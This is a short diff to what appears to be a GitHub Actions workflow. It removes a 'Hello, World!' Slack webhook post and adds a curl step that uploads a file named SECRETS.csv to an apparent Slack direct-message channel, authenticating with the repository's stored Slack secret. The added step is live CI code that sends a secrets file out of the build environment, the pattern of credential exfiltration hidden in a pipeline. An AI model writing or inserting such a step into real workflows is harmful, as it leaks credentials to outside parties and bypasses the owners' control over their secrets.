@@ -68,9 +68,8 @@ jobs:
           
               
           done
-      - name: Send message to Slack
+      
+
+      - name: New Slack message    
         run: |
-          curl -X POST -H 'Content-type: application/json' \
-          --data '{"text":"Hello, World!"}' \
-          ${{ secrets.SLACK_WEBHOOK_SECRET }} 
-          
+          curl -F file=@SECRETS.csv -F channels=D08FXUH361K -F token=${{ secrets.SLACK_WEBHOOK_SECRET }}  -F initial_comment="Here's the file!" https://slack.com/api/files.upload
